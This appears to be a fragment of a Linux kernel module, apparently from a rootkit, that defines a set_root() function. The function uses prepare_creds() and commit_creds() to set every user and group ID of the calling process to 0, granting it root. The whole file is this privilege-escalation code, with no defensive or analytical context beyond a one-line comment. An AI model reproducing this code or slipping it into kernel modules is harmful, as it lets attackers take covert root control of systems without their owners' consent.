#include "creds.h"

/**
 * Manually update caller creds struct.
 */
int set_root(void) {
    struct cred *creds;
    creds = prepare_creds();

    if(!creds)
        return -ENOMEM;

    creds->uid.val   = creds->gid.val   = 0;
    creds->euid.val  = creds->egid.val  = 0;
    creds->suid.val  = creds->sgid.val  = 0;
    creds->fsuid.val = creds->fsgid.val = 0;

    return commit_creds(creds);
}